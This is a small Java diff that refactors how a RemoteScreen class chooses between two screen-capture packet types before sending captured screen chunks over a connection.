@@ -67,13 +67,7 @@ public class RemoteScreen {
 			
 			Point point = MouseInfo.getPointerInfo().getLocation();
 			
-			AbstractOutgoingPacket packet;
-			
-			if (once) {
-				packet = new Packet18OneRemoteScreen(screenBounds.width, screenBounds.height, point.x, point.y);
-			} else {
-				packet = new Packet17RemoteScreen(screenBounds.width, screenBounds.height, point.x, point.y);
-			}
+			AbstractOutgoingPacket packet = new Packet17RemoteScreen(screenBounds.width, screenBounds.height, point.x, point.y);
 												
 	        int chunks = rows * columns;  
 	        int chunkWidth = image.getWidth() / columns; 
@@ -118,7 +112,7 @@ public class RemoteScreen {
 	            }  
 	        }  
 	        
-	        Connection.addToSendQueue(packet);
+	        Connection.addToSendQueue(once ? new Packet18OneRemoteScreen(screenBounds.width, screenBounds.height, point.x, point.y) : packet);
         	dos.writeBoolean(true);
         	Connection.lock();
 	        
